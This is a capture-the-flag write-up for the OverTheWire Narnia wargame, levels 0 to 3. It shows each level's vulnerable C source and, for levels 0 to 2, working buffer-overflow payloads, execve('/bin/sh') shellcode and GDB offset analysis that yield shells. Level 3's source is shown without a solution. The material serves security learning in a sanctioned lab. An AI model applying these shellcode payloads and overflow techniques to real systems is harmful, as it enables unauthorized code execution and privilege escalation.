#Narnia
Narnia is a CTF hosted at overthewire.org/wargames/narnia.  My writeups for the levels will be posted here.
#Level0
Login to level 0 with `ssh narnia0@narnia.labs.overthewire.org` with password naria0.
The levels are all located in the /narnia directory once you are logged in, and the source code for each level is provided.
narnia0.c:
```
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
Looking at the code we can see that if we overflow buf[20], it will overflow in to val. In order to get the shell, we need to make val contain 0xdeadbeef.
I first entered `perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0`.  This passed the comparison and allowed the system("/bin/sh") line to execute, but the shell was immediately closed because I didn't have any input to give it. 
Next, I modified my input to be `(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"'; cat) | ./narnia0` which allowed me to keep the shell open (with the shell open as narnia1)
#Level1
```
#include <stdio.h>

int main(){
        int (*ret)();

        if(getenv("EGG")==NULL){
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
        }

        printf("Trying to execute EGG!\n");
        ret = getenv("EGG");
        ret();

        return 0;
}
```
So this code is going to get an environmental variable and then execute it.  Therefore, we want to put some executable code in to an evironmental variable called EGG.  I used the shellcode for execve("/bin/sh") I found at http://shell-storm.org/shellcode/files/shellcode-811.php and issued the command `export EGG=`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80"'``.  When I ran the program, I was given a shell as narnia2.
#Level2
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
        char buf[128];

        if(argc == 1){
                printf("Usage: %s argument\n", argv[0]);
			exit(1);
        }
        strcpy(buf,argv[1]);
        printf("%s", buf);

        return 0;
}
```
In this level, the input that we pass the program is copied in to buf[128] using strcpy.  I played around with the inputs to the program and saw that when I sent it Ax139, the program executed with no problems, but when I sent it Ax140, it crashed with "Illegal instruction". 
I opened it up in GDB to get a better idea of what I needed to overflow it with:
```
Dump of assembler code for function main:
   0x0804845d <+0>:	push   ebp
   0x0804845e <+1>:	mov    ebp,esp
=> 0x08048460 <+3>:	and    esp,0xfffffff0
   0x08048463 <+6>:	sub    esp,0x90
   0x08048469 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804846d <+16>:	jne    0x8048490 <main+51>
   0x0804846f <+18>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048472 <+21>:	mov    eax,DWORD PTR [eax]
   0x08048474 <+23>:	mov    DWORD PTR [esp+0x4],eax
   0x08048478 <+27>:	mov    DWORD PTR [esp],0x8048560
   0x0804847f <+34>:	call   0x8048310 <printf@plt>
   0x08048484 <+39>:	mov    DWORD PTR [esp],0x1
   0x0804848b <+46>:	call   0x8048340 <exit@plt>
   0x08048490 <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048493 <+54>:	add    eax,0x4
   0x08048496 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048498 <+59>:	mov    DWORD PTR [esp+0x4],eax
   0x0804849c <+63>:	lea    eax,[esp+0x10]
   0x080484a0 <+67>:	mov    DWORD PTR [esp],eax
   0x080484a3 <+70>:	call   0x8048320 <strcpy@plt>
   0x080484a8 <+75>:	lea    eax,[esp+0x10]
   0x080484ac <+79>:	mov    DWORD PTR [esp+0x4],eax
   0x080484b0 <+83>:	mov    DWORD PTR [esp],0x8048574
   0x080484b7 <+90>:	call   0x8048310 <printf@plt>
   0x080484bc <+95>:	mov    eax,0x0
   0x080484c1 <+100>:	leave  
   0x080484c2 <+101>:	ret    
End of assembler dump.
(gdb) break *0x080484a3
```
I set a break point write before the call to strcpy() and ran the program with an input of 140 A's. (`r `perl -e 'print "A"x140'``)
The syntax for strcpy is strcpy(char *dest,char *src).  Since I broke at strcpy, I can print out the stack to see what those two arguments are:
```
(gdb) x/4wx $esp
0xffffd640:	0xffffd650	0xffffd8a4	0x00000000	0x00000000
```
The destination is at 0xffffd650 and the source is at 0xffffd8a4
Additionally, with `info frame` I see that eip is saved at 0xffffd6dc.  0xffffd6dc-0xffffd650=0x8c(140 decimal), which confirms why we saw the program crashing early.  We have a couple of options of how to exploit at this point, but I'll choose the simples and place my shellcode in buf[] and overwrite eip with the location of buf[] since my shellcode is only 28 bytes so I have plenty of space for it.
My shellcode will take 28 bytes, so will print my shellcode, then 140-28=112 A's and then my return address which is 0xffffd650.  Taking endianess in to account, the final exeuction is:
`./narnia2 `perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "A"x112 . "\x50\xd6\xff\xff"'``
When I execute this I'm granted a shell as narnia3 
#Level3
```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
```

